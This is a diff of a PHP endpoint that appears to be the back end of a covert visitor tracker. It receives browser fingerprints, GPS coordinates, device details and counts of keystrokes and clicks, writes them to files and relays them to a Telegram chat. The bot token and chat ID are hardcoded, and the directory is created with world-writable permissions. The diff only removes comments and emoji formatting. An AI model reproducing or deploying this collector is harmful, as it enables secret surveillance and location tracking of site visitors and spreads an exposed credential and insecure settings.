@@ -4,16 +4,13 @@ header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST');
 header('Access-Control-Allow-Headers: Content-Type');
 
-// Telegram Bot Config
 define('TELEGRAM_BOT_TOKEN', '8606946862:AAE-CRp9oC_ZV0RHvVRqtvTLBmRvuwBSs60');
 define('TELEGRAM_CHAT_ID', '8187030753');
 
-// Create data directory
 if (!is_dir('data')) {
     mkdir('data', 0777, true);
 }
 
-// Get POST data
 $input = file_get_contents('php://input');
 $data = json_decode($input, true);
 
@@ -23,27 +20,19 @@ if ($data === null) {
     exit;
 }
 
-// Add server info
 $data['server_info'] = [
     'timestamp' => date('Y-m-d H:i:s'),
     'server_ip' => $_SERVER['REMOTE_ADDR'],
     'server_name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
 ];
 
-// Generate filename
 $fingerprint = $data['uniqueFingerprint'] ?? $data['fingerprint'] ?? 'unknown';
 $filename = 'data/user_' . $fingerprint . '_' . date('Y-m-d_H-i-s') . '.json';
 
-// Save to file
 if (file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT))) {
-    
-    // Send to Telegram
     sendToTelegram($data);
-    
-    // Update admin stats
     updateAdminStats($data);
     
-    // Log access
     $log_entry = [
         'timestamp' => date('Y-m-d H:i:s'),
         'fingerprint' => $fingerprint,
@@ -87,32 +76,32 @@ function sendToTelegram($data) {
 }
 
 function formatTelegramMessage($data) {
-    $emoji = $data['type'] === 'join' ? '✅' : $data['type'] === 'page_view' ? '👁️' : '📊';
+    $emoji = $data['type'] === 'join' ? 'JOIN' : 'ACTIVITY';
     $fp = $data['fingerprint'] ?? $data['uniqueFingerprint'] ?? 'unknown';
     $loc = $data['gpsLocation'] ?? [];
-    $locStr = (!empty($loc['lat']) && !empty($loc['lng'])) ? "📍 {$loc['lat']}, {$loc['lng']}" : '📍 Unknown';
+    $locStr = (!empty($loc['lat']) && !empty($loc['lng'])) ? $loc['lat'] . ', ' . $loc['lng'] : 'Unknown';
     $ua = $data['userAgent'] ?? $data['data']['userAgent'] ?? 'Unknown';
     
-    $msg = "<b>{$emoji} USER ACTIVITY</b>\n";
-    $msg .= "<b>🆔 Fingerprint:</b> <code>{$fp}</code>\n";
-    $msg .= "<b>📱 Device:</b> " . substr($ua, 0, 80) . "...\n";
-    $msg .= "<b>🌐 Language:</b> " . ($data['language'] ?? 'Unknown') . "\n";
-    $msg .= "<b>⏰ Time:</b> " . ($data['timestamp'] ?? date('Y-m-d H:i:s')) . "\n";
-    $msg .= "<b>📍 Location:</b> {$locStr}\n";
-    $msg .= "<b>🎯 Action:</b> " . ($data['action'] ?? $data['type'] ?? 'Unknown') . "\n";
+    $msg = $emoji . " USER ACTIVITY\n";
+    $msg .= "Fingerprint: " . $fp . "\n";
+    $msg .= "Device: " . substr($ua, 0, 80) . "...\n";
+    $msg .= "Language: " . ($data['language'] ?? 'Unknown') . "\n";
+    $msg .= "Time: " . ($data['timestamp'] ?? date('Y-m-d H:i:s')) . "\n";
+    $msg .= "Location: " . $locStr . "\n";
+    $msg .= "Action: " . ($data['action'] ?? $data['type'] ?? 'Unknown') . "\n";
     
     if (isset($data['behavior'])) {
-        $msg .= "<b>🖱️ Clicks:</b> {$data['behavior']['clicks']}\n";
-        $msg .= "<b>📜 Scrolls:</b> {$data['behavior']['scrolls']}\n";
-        $msg .= "<b>⌨️ Keys:</b> {$data['behavior']['keystrokes']}\n";
-        $msg .= "<b>⏱️ Session:</b> {$data['behavior']['sessionDuration']}s\n";
+        $msg .= "Clicks: " . $data['behavior']['clicks'] . "\n";
+        $msg .= "Scrolls: " . $data['behavior']['scrolls'] . "\n";
+        $msg .= "Keys: " . $data['behavior']['keystrokes'] . "\n";
+        $msg .= "Session: " . $data['behavior']['sessionDuration'] . "s\n";
     }
     
     if (!empty($data['url'])) {
-        $msg .= "<b>🔗 Page:</b> {$data['url']}\n";
+        $msg .= "Page: " . $data['url'] . "\n";
     }
     
-    $msg .= "<b>🛡️ Server:</b> " . ($data['server_info']['timestamp'] ?? date('Y-m-d H:i:s'));
+    $msg .= "Server: " . ($data['server_info']['timestamp'] ?? date('Y-m-d H:i:s'));
     
     return $msg;
 }
